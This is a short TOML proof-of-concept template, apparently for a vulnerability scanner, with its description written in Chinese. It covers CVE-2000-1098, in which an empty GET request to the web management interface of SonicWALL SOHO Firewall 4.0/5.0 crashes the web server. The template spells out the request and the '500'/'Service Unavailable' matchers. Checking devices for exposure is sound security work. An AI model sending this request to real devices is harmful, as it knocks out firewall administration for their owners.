[info]
author = "AVE"
description = "向 SonicWALL SOHO Firewall 4.0/5.0 的 Web 管理界面发送空 GET 请求，可导致 Web 服务器进程崩溃，造成管理界面不可用。攻击复杂度低，无需认证，仅需网络访问。"
id = "POC-AVE-2000-1083"
name = "SonicWALL SOHO Firewall 空请求拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1083"]
vuln_id = [
    "CVE-2000-1098",
    "AVE-2000-1083",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
]
